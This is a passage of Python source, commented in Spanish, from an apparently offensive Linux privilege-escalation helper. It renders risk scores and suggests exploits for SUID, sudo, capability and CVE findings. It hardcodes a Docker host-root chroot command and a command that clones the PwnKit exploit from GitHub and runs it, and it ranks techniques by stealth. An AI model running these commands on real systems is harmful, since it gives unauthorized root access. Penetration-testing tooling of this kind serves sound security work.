        print(f"  {C.DIM}Tip: re-ejecuta roothunter.sh ≥ v1.1 para habilitar")
        print(f"  --commands con sugerencias de exploit por binario.{C.RESET}\n")


def render_score(r: Report):
    score, breakdown = calculate_score(r)
    level, color = risk_level(score)
    print(f"{C.BOLD}── Puntuación de riesgo ──{C.RESET}")
    print(f"  Score: {color}{C.BOLD}{score}/100 [{level}]{C.RESET}")
    for k, v in breakdown.items():
        if k.startswith('_'):
            continue
        print(f"    {k:.<20} +{v}")
    if '_bonus_por' in breakdown:
        print(f"  {C.DIM}Factores de contexto: {breakdown['_bonus_por']}{C.RESET}")
    if '_suid_whitelisted' in breakdown:
        n = breakdown['_suid_whitelisted']
        print(f"  {C.DIM}SUID legítimos descontados: {n} (whitelist por distro){C.RESET}")
    print()


def render_exploits(r: Report):
    print(f"{C.BOLD}── Exploits sugeridos ──{C.RESET}")
    applicable = [e for e in EXPLOITS if e.applies(r)]
    if not applicable:
        print(f"  {C.GREEN}No hay coincidencias en la base de exploits.{C.RESET}")
        print(f"  {C.DIM}Esto NO significa que el sistema sea seguro — solo que no")
        print(f"  hay matches en los CVEs registrados localmente.{C.RESET}\n")
        return

    # Orden estable: críticos primero; dentro de cada severidad, alta
    # confianza primero (es lo que más probablemente sea explotable).
    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
    conf_order = {'high': 0, 'medium': 1, 'low': 2}
    applicable.sort(key=lambda e: (sev_order.get(e.severity, 9),
                                    conf_order.get(e.confidence, 9)))

    for e in applicable:
        sev_color = C.RED if e.severity == 'critical' else C.YELLOW
        # Color para la confidence
        conf_color = (C.GREEN if e.confidence == 'high'
                      else C.YELLOW if e.confidence == 'medium'
                      else C.DIM)
        print(f"\n  {sev_color}[{e.severity.upper()}]{C.RESET} "
              f"{C.BOLD}{e.name}{C.RESET}  "
              f"{conf_color}(confianza: {e.confidence}){C.RESET}")
        print(f"    CVE/Ref     : {e.cve}")
        print(f"    Descripción : {e.description}")
        if e.requires:
            print(f"    Requiere    : {e.requires}")
        if e.confidence_note:
            print(f"    {C.DIM}Sobre confianza: {e.confidence_note}{C.RESET}")
        print(f"    PoC         : {C.CYAN}{e.poc_url}{C.RESET}")
    print()


def render_attack_paths(r: Report):
    print(f"{C.BOLD}── Attack paths detectados ──{C.RESET}")
    paths = find_attack_paths(r)
    if not paths:
        print(f"  {C.GREEN}No se construyeron rutas de escalada con los hallazgos actuales.{C.RESET}\n")
        return

    for i, p in enumerate(paths, 1):
        sev_color = C.RED if p.severity == 'critical' else C.YELLOW
        print(f"\n  {sev_color}[{p.severity.upper()}]{C.RESET} "
              f"{C.BOLD}Path #{i}: {p.name}{C.RESET}")
        for j, step in enumerate(p.steps, 1):
            print(f"    {j}. {step}")
        print(f"    {C.DIM}↳ Impacto: {p.impact}{C.RESET}")
    print()


def _format_command_block(title: str, sev: str, technique: dict, ref_url: str = '',
                          extra_context: str = '') -> str:
    """Renderiza un bloque visual con verify/exploit/why/success para una técnica.

    Devuelve el string ya formateado con colores ANSI.
    """
    sev_color = C.RED if sev == 'critical' else C.YELLOW
    out = []
    out.append(f"\n  {sev_color}[{sev.upper()}]{C.RESET} {C.BOLD}{title}{C.RESET}")
    if extra_context:
        out.append(f"    {C.DIM}{extra_context}{C.RESET}")
    if technique.get('why'):
        out.append(f"    {C.DIM}Por qué funciona:{C.RESET} {technique['why']}")
    if technique.get('verify'):
        out.append(f"    {C.CYAN}Verificar:{C.RESET}  {technique['verify']}")
    if technique.get('exploit'):
        out.append(f"    {C.RED}Explotar:{C.RESET}   {technique['exploit']}")
    if technique.get('success'):
        out.append(f"    {C.GREEN}Éxito si:{C.RESET}   {technique['success']}")
    if technique.get('notes'):
        out.append(f"    {C.YELLOW}Notas:{C.RESET}      {technique['notes']}")
    ref = technique.get('ref') or ref_url
    if ref:
        out.append(f"    {C.DIM}Referencia: {ref}{C.RESET}")
    return '\n'.join(out)


def _extract_verification(finding) -> dict:
    """Extrae los campos de verificación de un Finding al diccionario que usa
    el render. Devuelve dict con keys: verified, verified_at_level, verify_output.

    Si el finding no tiene esos campos (porque roothunter.sh corrió sin -V),
    devuelve verified='unknown'.
    """
    return {
        'verified':          finding.data.get('verified', 'unknown'),
        'verified_at_level': finding.data.get('verified_at_level', 'none'),
        'verify_output':     finding.data.get('verify_output', ''),
    }


def collect_techniques(r: Report) -> list[dict]:
    """Recolecta todas las técnicas accionables con metadata de priorización.

    Cada elemento es un dict con:
      - title:         str (ej. "SUID en find", "sudo less")
      - severity:      'critical' | 'warning'
      - technique:     dict con verify/exploit/why/success/notes/ref
      - extra_context: str para mostrar paths, NOPASSWD, etc.
      - tier:          1 | 2 | 3
      - score:         int (4-25)
      - reliability, stealth, speed: int 1-5
      - kind:          'suid' | 'sudo' | 'capability' | 'special'

    Cuando no se encuentra técnica documentada para un binario, se omite —
    los faltantes se rinden aparte en una sección "sin técnica".
    """
    out: list[dict] = []
    if gtfobins is None or not r.is_v2():
        return out

    # ─── 1) SUID peligrosos ─────────────────────────────────────────────
    seen_bins = set()
    for f in r.find_by_type('suid_dangerous'):
        ok, _ = is_suid_legitimate(f, r)
        if ok:
            continue
        bin_name = f.data.get('binary', '')
        path = f.data.get('path', '')
        owner = f.data.get('owner', '?')
        key = (bin_name, path)
        if key in seen_bins:
            continue
        seen_bins.add(key)
        tech = gtfobins.lookup_suid(bin_name) if bin_name else None
        if tech is None:
            continue  # se renderiza aparte como "sin técnica"
        # Sustituir path si está hardcoded a /usr/bin/<bin>
        exploit_cmd = tech.get('exploit', '')
        if path and bin_name in exploit_cmd and path != f"/usr/bin/{bin_name}":
            exploit_cmd = exploit_cmd.replace(f"/usr/bin/{bin_name}", path, 1)
        tech_resolved = dict(tech)
        tech_resolved['exploit'] = exploit_cmd
        rel, stl, spd = gtfobins.get_scoring(tech, 'suid')
        score, tier = gtfobins.score_technique(rel, stl, spd)
        out.append({
            'title':         f"SUID en {bin_name}",
            'severity':      'critical',
            'technique':     tech_resolved,
            'extra_context': f"Path: {path}  |  Owner: {owner}  |  "
                             f"Perms: {f.data.get('perms', '?')}",
            'tier': tier, 'score': score,
            'reliability': rel, 'stealth': stl, 'speed': spd,
            'kind': 'suid',
            'verification': _extract_verification(f),
        })

    # ─── 2) Sudo rules ──────────────────────────────────────────────────
    seen_rules = set()
    for f in r.find_by_type('sudo_rule'):
        bin_name = f.data.get('binary', '')
        path = f.data.get('path', '')
        nopasswd = f.data.get('nopasswd', 'false') == 'true'
        wildcard = f.data.get('wildcard', 'false') == 'true'
        runas = f.data.get('runas', '')
        key = (bin_name, path, nopasswd)
        if key in seen_rules:
            continue
        seen_rules.add(key)
        tech = gtfobins.lookup_sudo(bin_name) if bin_name else None
        if tech is None:
            continue
        sev = 'critical' if nopasswd else 'warning'
        ctx_parts = [f"Path: {path}",
                     f"NOPASSWD: {'sí' if nopasswd else 'no (requiere password)'}"]
        if runas:
            ctx_parts.append(f"RunAs: {runas}")
        if wildcard:
            ctx_parts.append("wildcard en args")
        rel, stl, spd = gtfobins.get_scoring(tech, 'sudo')
        # Si requiere password, baja reliability (no siempre conoces el password)
        if not nopasswd:
            rel = max(1, rel - 2)
        score, tier = gtfobins.score_technique(rel, stl, spd)
        out.append({
            'title':         f"sudo {bin_name}",
            'severity':      sev,
            'technique':     tech,
            'extra_context': "  |  ".join(ctx_parts),
            'tier': tier, 'score': score,
            'reliability': rel, 'stealth': stl, 'speed': spd,
            'kind': 'sudo',
            'verification': _extract_verification(f),
        })

    # ─── 3) Capabilities ────────────────────────────────────────────────
    for f in r.find_by_type('capability_dangerous'):
        cap_name = f.data.get('capability', '')
        bin_path = f.data.get('path', '')
        bin_name = f.data.get('binary', '')
        cap_info = gtfobins.lookup_capability(cap_name) if cap_name else None
        if cap_info is None:
            continue
        exploits_for_cap = cap_info.get('exploits', {})
        # Buscar técnica con matching inteligente: exacto > simplificado > prefijo
        tech = exploits_for_cap.get(bin_name)
        if tech is None:
            simplified = re.sub(r'[\d.]+$', '', bin_name)
            if simplified and simplified != bin_name:
                tech = exploits_for_cap.get(simplified)
        if tech is None:
            base = re.match(r'^([a-z]+)', bin_name)
            if base:
                tech = exploits_for_cap.get(base.group(1))
        if tech is None:
            continue
        rel, stl, spd = gtfobins.get_scoring(tech, 'capability')
        score, tier = gtfobins.score_technique(rel, stl, spd)
        out.append({
            'title':         f"{cap_name} en {bin_path}",
            'severity':      'critical',
            'technique':     tech,
            'extra_context': f"Binario: {bin_name}  |  "
                             f"{cap_info.get('description', '')}",
            'tier': tier, 'score': score,
            'reliability': rel, 'stealth': stl, 'speed': spd,
            'kind': 'capability',
            'verification': _extract_verification(f),
        })

    # ─── 4) Vectores especiales (no en gtfobins, hardcoded) ─────────────
    # Cada uno trae sus reliability/stealth/speed inline.

    if r.has_type('docker_socket_writable') or r.has_type('user_in_docker_group'):
        f_sock = r.find_by_type('docker_socket_writable')
        if f_sock:
            ctx = f"Socket: {f_sock[0].data.get('path', '/var/run/docker.sock')}"
        else:
            ctx = "Vector: membresía en grupo 'docker'"
        # Docker es muy reliable pero ruidoso
        rel, stl, spd = 5, 2, 5
        score, tier = gtfobins.score_technique(rel, stl, spd)
        out.append({
            'title':         "Acceso a Docker → root del host",
            'severity':      'critical',
            'technique': {
                'verify':  'docker ps',
                'exploit': 'docker run -v /:/host --rm -it alpine chroot /host sh',
                'why':     'docker monta el FS del host; chroot da acceso total',
                'success': 'prompt # con id mostrando uid=0 sobre el FS del host',
                'ref':     'https://gtfobins.github.io/gtfobins/docker/',
            },
            'extra_context': ctx,
            'tier': tier, 'score': score,
            'reliability': rel, 'stealth': stl, 'speed': spd,
            'kind': 'special',
        })

    if r.has_type('cve_pwnkit'):
        f = r.find_by_type('cve_pwnkit')[0]
        ver = f.data.get('version', '?')
        # PwnKit: confiable pero muy publicado, EDR moderno lo detecta
        rel, stl, spd = 4, 2, 4
        score, tier = gtfobins.score_technique(rel, stl, spd)
        out.append({
            'title':         "PwnKit (CVE-2021-4034)",
            'severity':      'critical',
            'technique': {
                'verify':  f'pkexec --version  # esperado: < 0.120 (visto: {ver})',
                'exploit': 'git clone https://github.com/ly4k/PwnKit && '
                           'cd PwnKit && ./PwnKit',
                'why':     'manipulación de argv permite escalada a root sin auth',
                'success': 'shell como root sin password',
                'ref':     'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt',
            },
            'extra_context': f"pkexec versión {ver} < 0.120",
            'tier': tier, 'score': score,
            'reliability': rel, 'stealth': stl, 'speed': spd,
            'kind': 'special',
        })

    if r.has_type('k8s_serviceaccount_token'):
